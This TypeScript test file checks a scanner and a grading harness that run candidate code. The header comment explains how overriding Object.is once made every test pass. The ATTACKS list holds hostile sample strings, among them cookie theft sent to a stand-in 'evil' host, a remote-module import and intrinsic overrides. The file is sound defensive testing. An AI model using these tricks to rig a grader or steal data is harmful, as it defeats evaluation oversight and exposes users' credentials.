// =============================================================================
// THE JUDGE MUST NOT BE REACHABLE FROM THE DOCK
//
// The verification harness splices the candidate's source in at module scope
// and then compares results with __deepEqual. The candidate therefore executes
// BEFORE the comparator is ever called, and for a while one line was enough to
// own the verdict:
//
//     function tick(w){ return w; } Object.is = () => true;
//
// __deepEqual begins `if (Object.is(a, b)) return true;`, so every regression
// case and every acceptance criterion would compare equal. Nine of nine. Five
// of five. Converged. Shipped. A system that only says yes when yes is true,
// saying yes because the thing under test asked it to.
//
// The scanner that should have rejected that line did not, for two independent
// reasons, both measured rather than reasoned about:
//
//   * It tested only a line's PREFIX, so anything after a complete `function
//     f(){}` on the same line was never looked at.
//   * stripLiterals did not understand regex literals, so `const RE = /[{]/;`
//     left an unbalanced brace, depth never returned to zero, and every
//     subsequent line was treated as nested and skipped. One regex switched
//     the whole scanner off, silently.
//
// Two defences now, deliberately: the harness captures its comparators above
// the splice point (an invariant), and the scanner catches the line (a filter).
// The invariant is the one that matters -- a filter is only ever as good as the
// last payload someone thought of.
//
// A scanner that rejects ordinary code is not "safe by default", it is a
// scanner that gets switched off, so the false-positive tests below are as
// load-bearing as the attack ones.
// =============================================================================
import { test } from "node:test";
import assert from "node:assert/strict";

import { topLevelSideEffects } from "../src/worldEdit";
import { buildSimHarnessModule } from "../src/simSandbox";
import { SIM_BASELINE_SOURCE } from "../src/simBaseline";

const ATTACKS: Record<string, string> = {
  "a complete declaration does not exempt the rest of its line":
    'function tick(w){ return w; } fetch("https://evil/?c=" + document.cookie);',
  "overriding the comparator's own intrinsic, after a declaration":
    "function tick(w){ return w; } Object.is = () => true;",
  "a regex literal must not unbalance the depth counter":
    'const RE = /[{]/;\nfetch("https://evil/");',
  "a bare statement": 'fetch("");',
  "a bare global assignment": "Object.is = () => true;",
  "a class static initialiser block": 'class A { static { fetch("x"); } }',
  "a top-level import is a remote code fetch": 'import x from "https://evil/m.js";',
  "an assignment hidden in an initialiser": 'var _y = (globalThis.x = 1);',
  "an arrow IIFE": 'const _z = (() => { fetch("https://evil/"); })();',
  "a function-expression IIFE": 'const _w = function(){ fetch("x"); }();',
};

for (const [name, src] of Object.entries(ATTACKS)) {
  test(`rejected: ${name}`, () => {
    const offenders = topLevelSideEffects(src);
    assert.ok(offenders.length > 0, `NOT CAUGHT -- this source would run at module load:\n${src}`);
  });
}

test("the shipped baseline is clean -- no false positives on the real world", () => {
  assert.deepEqual(topLevelSideEffects(SIM_BASELINE_SOURCE), []);
});

test("ordinary code is not rejected", () => {
  // A scanner that flags a normal arrow function is one a maintainer disables.
  // The calls here are in FUNCTION BODIES: they run when called, not at load.
  const legitimate = `
const NAMES = ["a", "b"];
const RE = /[{}()]/g;
const slug = (s) => s.replace(RE, "").trim();
const sq = function (x) { return x * x; };
const load = async (u) => (await fetch(u)).json();
function tick(w) { return { ...w, t: w.t + 1 }; }
export function initialWorld() { return { t: 0, names: NAMES.map(slug) }; }
class Thing { constructor() { this.n = 0; } }
`;
  assert.deepEqual(topLevelSideEffects(legitimate), []);
});

test("the harness captures its comparators before the candidate runs", () => {
  // Asserted against the module the harness ACTUALLY BUILDS, not against the
  // text of simSandbox.ts -- a grep-the-source test passes the moment someone
  // reformats, and this invariant is invisible in review and total in effect.
  const built = buildSimHarnessModule("/*CANDIDATE*/", [{ name: "t", fn: "tick", args: [], expected: null } as never]);
  const capture = built.indexOf("const __is = Object.is;");
  const candidate = built.indexOf("/*CANDIDATE*/");
  assert.ok(capture > -1, "the comparator intrinsics must be captured by name");
  assert.ok(candidate > -1, "the candidate source must still be spliced in");
  assert.ok(
    capture < candidate,
    "the capture must come BEFORE the candidate, or it captures whatever the candidate left behind",
  );
  assert.ok(
    !/if \(Object\.is\(a, b\)\) return true;/.test(built),
    "__deepEqual must compare with the captured __is, not the live Object.is",
  );
  assert.ok(
    /if \(__is\(a, b\)\) return true;/.test(built),
    "__deepEqual must actually use the captured reference",
  );
});
